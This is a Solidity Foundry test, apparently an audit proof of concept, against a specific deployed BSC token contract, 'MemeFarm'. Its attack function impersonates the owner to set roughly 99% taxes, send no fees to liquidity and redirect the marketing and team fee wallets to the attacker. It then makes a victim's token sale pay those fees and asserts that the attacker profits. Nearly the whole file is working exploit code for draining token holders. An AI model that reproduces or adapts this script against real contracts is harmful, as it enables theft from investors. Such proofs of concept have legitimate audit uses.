contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);
    IMemeFarm memeFarm;
    IUniswapV2Router02 uniswapV2Router;
    address weth;
    address owner;
    address constant victim = address(0xDEADBEEF);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Target contract instance
        memeFarm = IMemeFarm(TARGET);

        // External contracts
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        weth = uniswapV2Router.WETH();
        owner = memeFarm.owner();

        // Deal assets
        deal(attacker, 100 ether);
        deal(victim, 10 ether);

        // Provide liquidity to the pair to enable swaps
        uint256 tokensForLiquidity = 1_000_000_000_000 * 1e9; // 1 Trillion tokens
        vm.prank(owner);
        memeFarm.transfer(attacker, tokensForLiquidity);

        memeFarm.approve(address(uniswapV2Router), tokensForLiquidity);
        uniswapV2Router.addLiquidityETH{value: 50 ether}(
            address(memeFarm),
            tokensForLiquidity / 2,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Victim buys some tokens to hold
        vm.startPrank(victim);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(memeFarm);
        uniswapV2Router.swapExactETHForTokens{value: 1 ether}(0, path, victim, block.timestamp);
        vm.stopPrank();

        assertGt(memeFarm.balanceOf(victim), 0, "Victim should have tokens after buying");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 attackerInitialBalance = attacker.balance;

                // 1. As owner, set malicious parameters
                vm.startPrank(owner);
                // Set sell tax to 99%
                memeFarm.setAllTaxes(33, 33, 33);
                // Set distribution so no fees go to liquidity
                memeFarm.setDistributionSettings(0, 1, 1);
                // Redirect fee wallets to attacker
                memeFarm.setMarketinWalleAddress(attacker);
                memeFarm.setTeamWalletAddress(attacker);
                vm.stopPrank();

                // 2. As victim, sell tokens, triggering the trap
                uint256 victimBalance = memeFarm.balanceOf(victim);
                vm.startPrank(victim);
                memeFarm.approve(address(uniswapV2Router), victimBalance);

                address[] memory path = new address[](2);
                path[0] = address(memeFarm);
                path[1] = weth;

                uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    victimBalance,
                    0,
                    path,
                    victim,
                    block.timestamp
                );
                vm.stopPrank();

                // 3. Check profit
                uint256 attackerFinalBalance = attacker.balance;
                assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker should have made a profit");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

